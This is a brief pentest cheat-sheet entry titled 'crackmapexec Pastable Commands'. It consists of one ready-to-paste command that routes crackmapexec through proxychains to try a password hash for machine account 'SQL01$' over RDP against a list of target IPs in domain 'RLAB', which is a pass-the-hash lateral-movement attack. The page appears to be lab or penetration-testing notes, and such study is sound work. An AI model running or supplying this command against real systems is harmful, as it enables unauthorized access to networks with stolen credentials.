# crackmapexec Pastable Commands

### RDP brute with hash&#x20;

* Have a target ip list in text file
* Username to try across a network&#x20;
* Password Hash

```
proxychains -f proxy9051.conf crackmapexec rdp target-list.txt -d RLAB -u 'SQL01$' -H 47b071asdfd0f06770137996c --no-bruteforce 
```
